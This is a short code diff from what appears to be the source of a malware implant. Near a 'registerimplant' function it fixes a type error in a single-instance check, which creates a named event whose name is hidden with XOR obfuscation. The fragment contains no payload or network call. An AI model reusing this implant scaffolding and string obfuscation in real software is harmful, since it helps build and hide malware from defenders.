@@ -41,7 +41,7 @@ void registerimplant(void){
 }
 
 BOOL CheckInstance(){
-    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE,xor_string("RTWWTRZZY",0x15));
+    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE,xor_string("RTWWTRZZY",0x15).c_str());
     if(m_hStartEvent == NULL) {
         CloseHandle( m_hStartEvent ); 
         return false;
